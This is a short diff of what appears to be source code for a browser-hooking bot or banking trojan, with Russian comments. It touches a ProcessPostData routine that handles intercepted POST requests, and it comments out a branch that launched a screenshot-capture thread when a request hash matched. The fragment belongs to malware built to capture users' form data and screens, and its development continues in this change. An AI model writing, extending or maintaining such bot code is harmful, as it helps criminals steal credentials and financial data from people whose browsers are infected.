@@ -17,7 +17,6 @@
 #include "Splice.h"
 #include "Unhook.h"
 #include "Loader.h"
-#include "Screens.h"
 #include "Requests.h"
 #include "BotHTTP.h"
 #include "HTTPConsts.h"
@@ -423,12 +422,17 @@ bool ProcessPostData(PRequest Request)
 	// Обработать POST данные
 
 	// Проверяем библиотеку ScreenShot
+/*
+
+	Отключаем обработку скриншотов
+
 	if ( CalcHash(Request->Optional) == 0x24DE3210 )
 	{
 		FFDBG(Request, NULL, "Обрабатываем скриншоты");
 		StartThread( ScreensThread, NULL );
 		return true;
 	}
+*/
 
 	// Проверяем не обрабатывали ли мы этот запрос
 	FFDBG(Request, NULL, "Получаем хэш");
